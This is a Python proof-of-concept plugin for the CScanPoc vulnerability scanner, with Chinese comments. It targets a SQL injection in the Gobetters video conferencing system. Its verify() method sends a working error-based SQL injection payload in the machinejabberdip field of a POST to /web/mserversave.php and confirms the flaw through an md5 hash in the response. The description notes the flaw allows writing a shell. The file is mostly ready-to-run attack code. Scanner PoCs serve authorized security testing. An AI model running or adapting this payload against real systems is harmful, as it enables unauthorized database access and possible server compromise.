# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Gobetters_0002'  # 平台漏洞编号，留空
    name = 'Gobetters视频会议系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-11-19'  # 漏洞公布时间
    desc = '''
        Gobetters视频会议系统SQL注入漏洞二，危害比较大，可以直接写Shell。
        /web/mserversave.php
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0134733'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Gobetters'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '61ff889a-4c01-433f-9abc-602fb1b3826e'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg+"/web/mserversave.php"
            post = "machineid=1&machinetype=1&managewebport=89&serverwebport=8181&machinename=tofi&machinejabberdip=1%27%20AND%20(SELECT%207173%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20'ninq'='ninq&personnum=10&directnum=0&sipnum=0&watchnum=0&h323voip=11111&h323num=0&voipnum=0&h323router=0&from=list"

            code, head, res, errcode, _ = hh.http(url, post)
            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
